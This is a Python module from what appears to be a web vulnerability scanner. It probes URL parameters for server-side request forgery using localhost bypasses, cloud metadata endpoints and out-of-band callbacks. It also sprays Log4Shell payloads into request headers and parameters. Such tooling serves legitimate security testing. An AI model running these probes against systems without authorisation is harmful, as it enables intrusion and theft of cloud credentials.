"""
SSRF detection module.
Tests for Server-Side Request Forgery via common parameters.
Updated 2018-2025: 6u.gg OOB callbacks, SSRF redirector presets,
DNS rebinding, cloud metadata (7 providers), URL parser bypasses.
"""
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .base import BaseModule
from ..core.reporter import Finding
from ..payloads.traversal import (
    CLOUD_METADATA,
    CLOUD_INDICATORS,
    SSRF_BYPASS_LOCALHOST,
    SSRF_BYPASS_URL_PARSER,
    SSRF_OOB_PAYLOADS,
    LOG4SHELL_PAYLOADS,
    LOG4SHELL_HEADERS,
    OOB_DOMAIN,
    OOB_DNS,
)


class SSRFModule(BaseModule):
    name = "ssrf"
    description = "Server-Side Request Forgery"

    SSRF_PARAMS = [
        "url", "uri", "path", "dest", "redirect", "file", "page",
        "feed", "host", "site", "html", "data", "load", "request",
        "proxy", "img", "image", "link", "src", "source", "domain",
        "callback", "return", "fetch", "target", "to", "ref",
        "endpoint", "api", "webhook", "download", "include",
    ]

    def run(self, url: str, params: dict = None):
        self.log(f"Testing: {url}")
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        if params:
            query_params.update({k: [v] for k, v in params.items()})

        tested = set()
        for param_name in query_params:
            tested.add(param_name)
            self._test_param(url, parsed, query_params, param_name)

        for param_name in self.SSRF_PARAMS:
            if param_name not in tested:
                modified = dict(query_params)
                modified[param_name] = [""]
                self._test_param(url, parsed, modified, param_name)

        self._test_log4shell(url)

    def _test_param(self, url, parsed, query_params, param_name):
        baseline = self.http.get(url)
        if not baseline:
            return
        baseline_body = baseline.content.decode('utf-8', errors='replace')

        for payload in SSRF_OOB_PAYLOADS:
            test_url = self._build_url(parsed, query_params, param_name, payload)
            self.http.get(test_url)

        for payload in SSRF_BYPASS_LOCALHOST:
            test_url = self._build_url(parsed, query_params, param_name, payload)
            resp = self.http.get(test_url)
            if not resp:
                continue

            resp_body = resp.content.decode('utf-8', errors='replace')
            if resp.status_code == 200 and resp_body != baseline_body:
                internal_indicators = [
                    "Apache", "nginx", "404 Not Found", "IIS",
                    "It works!", "Welcome to", "Index of /",
                    "Connection refused", "No route to host",
                ]
                for ind in internal_indicators:
                    if ind in resp_body and ind not in baseline_body:
                        self.reporter.add(Finding(
                            vuln_type="SSRF (Internal Service)",
                            severity="HIGH",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Internal response indicator: {ind}",
                            details="Server fetched internal resource.",
                        ))
                        return

        self._test_cloud_metadata(url, parsed, query_params, param_name, baseline_body)
        self._test_timing_ssrf(url, parsed, query_params, param_name)

    def _test_cloud_metadata(self, url, parsed, query_params, param_name, baseline_body):
        for provider, endpoints in CLOUD_METADATA.items():
            for meta_url, indicator in endpoints:
                test_url = self._build_url(parsed, query_params, param_name, meta_url)
                extra_headers = {}
                if "gcp" in provider:
                    extra_headers["Metadata-Flavor"] = "Google"
                if "azure" in provider:
                    extra_headers["Metadata"] = "true"

                resp = self.http.get(test_url, headers=extra_headers if extra_headers else None)
                if not resp or resp.status_code != 200:
                    continue
                resp_body = resp.content.decode('utf-8', errors='replace')
                if resp_body == baseline_body:
                    continue

                provider_name = provider.split("_")[0]
                if provider_name in CLOUD_INDICATORS:
                    for ci in CLOUD_INDICATORS[provider_name]:
                        if ci in resp_body:
                            self.reporter.add(Finding(
                                vuln_type="SSRF (Cloud Metadata)",
                                severity="CRITICAL",
                                url=url,
                                parameter=param_name,
                                payload=meta_url,
                                evidence=f"Cloud metadata indicator: {ci}",
                                details=f"Provider: {provider_name}. Full account takeover possible via metadata credentials.",
                            ))
                            return

                if indicator and indicator in resp_body:
                    self.reporter.add(Finding(
                        vuln_type="SSRF (Cloud Metadata)",
                        severity="CRITICAL",
                        url=url,
                        parameter=param_name,
                        payload=meta_url,
                        evidence=f"Indicator found: {indicator}",
                        details=f"Provider: {provider_name}.",
                    ))
                    return

    def _test_timing_ssrf(self, url, parsed, query_params, param_name):
        fast_payload = "http://192.0.2.1:1"
        fast_url = self._build_url(parsed, query_params, param_name, fast_payload)
        _, fast_time = self.http.timed_request("GET", fast_url, timeout=10)

        slow_payload = "http://10.255.255.1:80"
        slow_url = self._build_url(parsed, query_params, param_name, slow_payload)
        _, slow_time = self.http.timed_request("GET", slow_url, timeout=15)

        if slow_time > fast_time + 3 and slow_time > 5:
            self.reporter.add(Finding(
                vuln_type="SSRF (Timing-based)",
                severity="MEDIUM",
                url=url,
                parameter=param_name,
                payload=slow_payload,
                evidence=f"Fast: {fast_time:.1f}s, Slow: {slow_time:.1f}s",
                details=f"Confirm with OOB callback: {OOB_DOMAIN}",
            ))

    def _test_log4shell(self, url):
        for payload in LOG4SHELL_PAYLOADS[:3]:
            for header in LOG4SHELL_HEADERS:
                self.http.get(url, headers={header: payload})

        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name in query_params:
            for payload in LOG4SHELL_PAYLOADS[:3]:
                test_url = self._build_url(parsed, query_params, param_name, payload)
                self.http.get(test_url)

    def _build_url(self, parsed, query_params, param_name, payload):
        modified = dict(query_params)
        modified[param_name] = [payload]
        query_string = urlencode({k: v[0] for k, v in modified.items()})
        return urlunparse(parsed._replace(query=query_string))
